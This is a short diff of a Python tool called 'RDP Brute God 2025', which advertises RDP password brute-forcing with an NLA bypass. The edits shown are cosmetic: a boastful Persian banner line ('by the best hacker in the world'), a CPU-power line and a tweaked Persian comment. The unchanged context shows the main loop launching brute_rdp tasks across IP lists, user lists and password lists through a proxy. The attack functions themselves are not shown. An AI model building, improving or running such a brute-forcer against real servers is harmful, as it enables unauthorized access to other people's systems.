@@ -14,8 +14,9 @@ from datetime import datetime
 
 print("""
 ╔═══════════════════════════════════════════════════════════╗
-║                    RDP Brute God 2025                     ║
-║       Smart RDP Brute + Auto NLA Bypass (-anla)           ║
+║           RDP Brute God 2025 – توسط بهترین هکر دنیا        ║
+║       Smart RDP Brute + Auto NLA Bypass (-anla)          ║
+║              98%% CPU Power – Modular & Ultra Fast         ║
 ╚═══════════════════════════════════════════════════════════╝
 """)
 
@@ -77,7 +78,7 @@ async def main():
     sem = asyncio.Semaphore(MAX_WORKERS)
     loop = asyncio.get_event_loop()
 
-    # فیکس نهایی: periodic_stats حالا async هست، مستقیم create_task می‌کنیم
+    # فیکس نهایی: periodic_stats async هست، مستقیم create_task می‌کنیم
     loop.create_task(periodic_stats(stats, lock, cpu_proc, stats["start_time"]))
 
     tasks = [brute_rdp(ip, sem, USERS, PASSWORD_LIST, PROXY_CMD, args.auto_nla, results_file, stats, lock) for ip in all_ips]
@@ -89,4 +90,3 @@ async def main():
 signal.signal(signal.SIGINT, lambda s,f: os._exit(0))
 if __name__ == "__main__":
     asyncio.run(main())
-
